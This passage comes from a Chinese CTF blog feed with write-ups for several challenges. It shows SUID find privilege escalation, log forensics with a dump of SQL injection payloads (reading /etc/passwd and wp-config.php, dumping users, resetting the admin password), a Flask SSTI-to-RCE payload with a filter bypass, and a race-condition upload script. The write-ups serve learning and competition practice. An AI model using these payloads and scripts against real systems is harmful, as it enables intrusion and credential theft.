class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解码得到flag</p><hr><h1 id="提权挑战"><a href="#提权挑战" class="headerlink" title="提权挑战"></a>提权挑战</h1><p>提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/usr/bin/su/usr/bin/gpasswd/usr/bin/chfn/usr/bin/find/usr/bin/chsh/usr/bin/umount/usr/bin/newgrp/usr/bin/passwd/usr/bin/mount/usr/bin/sudo/usr/lib/dbus-1.0/dbus-daemon-launch-helper<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/ls /root/ <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>flag.txt<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/cat /root/flag.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>flag<span class="token punctuation">&#123;</span>SUID_Command_Injection_Found_2024<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="misc-时光追溯"><a href="#misc-时光追溯" class="headerlink" title="misc-时光追溯"></a>misc-时光追溯</h1><p>从phpinfo可以知道apache日志路径，把日志dump下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/cat /var/log/apache2/access.log.bak <span class="token operator">></span> /tmp/1.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'WPScan'</span> /tmp/1.txt <span class="token operator">></span> /tmp/6.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最下面</p><pre class="line-numbers language-log" data-language="log"><code class="language-log"><span class="token ip-address constant">140.187.54.232</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:17:37 +0000</span><span class="token punctuation">]</span> <span class="token string">"POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">1460</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"</span><span class="token ip-address constant">115.123.255.233</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:17:54 +0000</span><span class="token punctuation">]</span> <span class="token string">"GET /wp-content/plugins/wp-file-manager/lib/files/decode.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">18926677</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"</span><span class="token ip-address constant">134.116.79.14</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:18:02 +0000</span><span class="token punctuation">]</span> <span class="token string">"GET /wp-content/plugins/wp-file-manager/lib/files/decode.php?test=123123123 HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">16979933</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么找最早访问 connector.minimal.php 的地方</p><p><img src="/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/image-20250128220534719.png" alt="image-20250128220534719"></p><p><code>24/Jan/2025:15:11:00-37.106.98.98-/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p><p>flag：<code>flag&#123;c40bc119b7c30c0d48ac0e25749e3be0&#125;</code></p><hr><h1 id="misc-数据足迹"><a href="#misc-数据足迹" class="headerlink" title="misc-数据足迹"></a>misc-数据足迹</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /var/log/mysql/slow-query.log.bak <span class="token operator">></span> /tmp/slow.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /var/log/mysql/error.log.bak <span class="token operator">></span> /tmp/err.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>dump下来后使用<code> sort slow.log | uniq -c</code>清洗数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sort</span> slow.log <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token parameter variable">-c</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"timestamp"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_usermeta"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Time"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_postmeta"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Query_time"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_posts"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"comment_post_ID"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"ID"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON wordpress.* TO &#39;hack&#39;@&#39;%&#39;;SELECT * FROM (,6,7,8,9,10) AS t;SELECT * FROM (1,2,3,4,) AS t;SELECT * FROM (4f527564) AS t;SELECT * FROM (4f597275) AS t;SELECT * FROM (596c4153) AS t;SELECT * FROM (5b77616c) AS t;SELECT * FROM (65717f57) AS t;SELECT * FROM (666 *&#x2F;) AS t;SELECT * FROM (6c6c6f62) AS t;SELECT * FROM (7373714d) AS t;SELECT * FROM (747e6f63) AS t;SELECT * FROM (7f6c637f) AS t;SELECT * FROM (LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)) AS t;SELECT * FROM (SELECT * FROM wp_users WHERE id&#x3D;1) AS t;SELECT * FROM (UNION SELECT) AS t;SELECT * FROM wp_links WHERE link_visible &#x3D; &#39;Y&#39;;SELECT * FROM wp_options WHERE autoload&#x3D;&#39;yes&#39;;SELECT * FROM wp_options WHERE option_name LIKE &#39;_site%&#39;;SELECT * FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id &#x3D; tt.term_id;SELECT * FROM wp_terms WHERE term_id IN (SELECT term_id FROM wp_term_taxonomy);SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; AND password &#x3D; &#39;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;;SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;;SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; UNION SELECT null,null,null,null,null,null,null,null,null,null;SELECT * FROM wp_users WHERE user_login LIKE 0x61646D696E;SELECT * INTO OUTFILE &#39;&#x2F;tmp&#x2F;dump.txt&#39; FROM wp_users;SELECT &#x2F;* d7275;SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name&#x3D;&#39;wp_users&#39;;SELECT CONCAT(0x7c,user_login,0x7c,user_pass,0x7c) FROM wp_users;SELECT CURRENT_USER();SELECT GROUP_CONCAT(table_name) FROM information_schema.tables;SELECT IF(SUBSTRING(user_pass,1,1)&#x3D;&#39;a&#39;,SLEEP(5),0) FROM wp_users WHERE user_login&#x3D;&#39;admin&#39;;SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;);SELECT LOAD_FILE(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php&#39;);SELECT SCHEMA_NAME FROM information_schema.schemata;SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema&#x3D;&#39;wordpress&#39;;SELECT UNHEX(HEX(LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)));SELECT USER();SELECT VERSION();SELECT id, user_login, user_pass FROM wp_users &#x2F;*dump users*&#x2F;;SELECT option_name, option_value FROM wp_options WHERE option_name LIKE &#39;%key%&#39;;UPDATE wp_users SET user_pass &#x3D; MD5(&#39;hacked&#39;) WHERE user_login &#x3D; &#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察这几个子查询t的部分</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">6c6c6f62747e6f634f5275647373714d4f59727565717f577f6c637f596c41535b77616c666 *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为flag的16进制是<code>666c6167</code>，可知是<strong>逆序加十六进制解码</strong></p><p>解出来是<code>flag&#123;SQLi_slow_query_MAsster_Controll.</code></p><p>猜测和<code>*/</code>有关，找<code>/*</code>那行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT 1 &#x2F;* d7275;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么把这个 d7275 带进去解码，就是flag</p><p>最终的flag：<code>flag&#123;SQLi_slow_query_MAsster_Controller&#125;</code></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;除夕打ctf ver3&lt;/p&gt;
&lt;p&gt;二进制的部分不会啦 _(:3 」∠ )_&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>第八届西湖论剑</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2025-01-18T01:58:56.000Z</published>
    <updated>2025-01-20T13:25:45.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所以 已经没事了😄</p><p>参考：<a href="https://blog.csdn.net/uuzeray/article/details/145228235">https://blog.csdn.net/uuzeray/article/details/145228235</a></p><span id="more"></span><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174518066.png" alt="image-20250118174518066"></p><hr><h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p>输入一些其他字符，然后输入密码会报错弹出flask debug界面</p><p>泄露 app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> is_safe_input<span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> phone <span class="token operator">!=</span> <span class="token string">"1686682318"</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">"Happy_news_admin"</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span>\    <span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>\    <span class="token operator">&lt;</span>head<span class="token operator">></span>\        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>\        <span class="token operator">&lt;</span>title<span class="token operator">></span>login failed<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>\    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到账密<code>1686682318:Happy_news_admin</code></p><p>但是输入正确后依旧重定向回 &#x2F;</p><p>猜测是在 render_template_string 打 ssti，在&#x2F;login处填payload，在&#x2F;cpass处获取回显</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum.__globals__.os.popen<span class="token punctuation">(</span><span class="token string">'ls ..'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在 &#x2F;flagf149</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> abort<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquoteapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>phone <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">is_safe_input</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']</span>    unsafe_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'less'</span><span class="token punctuation">,</span><span class="token string">'nl'</span><span class="token punctuation">,</span><span class="token string">'tac'</span><span class="token punctuation">,</span><span class="token string">'more'</span><span class="token punctuation">,</span><span class="token string">'tail'</span><span class="token punctuation">,</span><span class="token string">'od'</span><span class="token punctuation">,</span><span class="token string">'grep'</span><span class="token punctuation">,</span><span class="token string">'awd'</span><span class="token punctuation">,</span><span class="token string">'sed'</span><span class="token punctuation">,</span><span class="token string">'64'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'%2f'</span><span class="token punctuation">,</span><span class="token string">'%2F'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造rce：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>%26%26head f<span class="token punctuation">\</span>lagf149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118105248402.png" alt="image-20250118105248402"></p><hr><h1 id="Rank-U（Unsolved）"><a href="#Rank-U（Unsolved）" class="headerlink" title="Rank-U（Unsolved）"></a>Rank-U（Unsolved）</h1><p>进去一个登录框，弱密码爆破失败，sql注入无果</p><p>PHP&#x2F;7.3.28 Apache&#x2F;2.4.38 (Debian)</p><p>换了几个字典，最终爆出 year2000</p><p>里面一个文件上传，啥都能传，但是访问 Uploads 里的文件路径只有 jpg 后缀的能读到，猜测其他后缀是被删了</p><p>尝试条件竞争，py脚本+burp把我c盘缓存淦爆了都没竞争成功</p><br><p>存个条件竞争的脚本吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    burp0_url <span class="token operator">=</span> <span class="token string">"http://139.155.126.78:30675/admin/index.php"</span>  <span class="token comment"># 更新 URL</span>    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"bsgq3v7goubrk1ciepr0se2dfc"</span><span class="token punctuation">&#125;</span>  <span class="token comment"># 更新 PHP 会话 ID</span>        burp0_data <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">"------WebKitFormBoundarygIbPTT5pJVbv72RS\r\n"</span>        <span class="token string">"Content-Disposition: form-data; name=\"file_upload\"; filename=\"yjh3.php\"\r\n"</span>        <span class="token string">"Content-Type: application/octet-stream\r\n\r\n"</span>        <span class="token string">"&lt;?php echo file_get_contents('/flag');?>\r\n"</span>  <span class="token comment"># 改为新代码</span>        <span class="token string">"------WebKitFormBoundarygIbPTT5pJVbv72RS--\r\n"</span>    <span class="token punctuation">)</span>        <span class="token comment"># 发送 POST 请求，只保留 Cookie</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>        <span class="token comment"># 提取文件名并保存到本地文件</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'./Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/p>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 strip() 去除可能的换行符</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无法提取文件路径或文件上传失败"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url0 <span class="token operator">=</span> <span class="token string">'http://139.155.126.78:30675/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 直接读取文件内容，去除换行符并逐行处理</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            shellpath <span class="token operator">=</span> url0 <span class="token operator">+</span> filename<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 strip() 去除换行符</span>             <span class="token comment"># 发起 GET 请求</span>            r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellpath<span class="token punctuation">)</span>             <span class="token comment"># 如果状态码不是 404，输出状态码和响应文本</span>            <span class="token keyword">if</span> r1<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">404</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个脚本多开点才行</p><p>合着就是线程少了竞争不来是吧</p><hr><h1 id="sqli-or-not（复现）"><a href="#sqli-or-not（复现）" class="headerlink" title="sqli or not（复现）"></a>sqli or not（复现）</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hacker1!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>username<span class="token operator">&amp;&amp;</span>info<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> username <span class="token operator">=</span> info<span class="token punctuation">.</span>username<span class="token punctuation">;</span>            <span class="token keyword">var</span> password <span class="token operator">=</span> info<span class="token punctuation">.</span>password<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|\"|\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> info<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|\"|\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hacker2!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>            sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>            sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>            connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>rs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'error1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'username or password error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"please input the data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"please input the data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要返回成功即可得到flag</p><p>我们传进去的参数是info，内容是json</p><p>首先是第一个waf，匹配<code>,</code>，只需要url编码即可绕过</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span 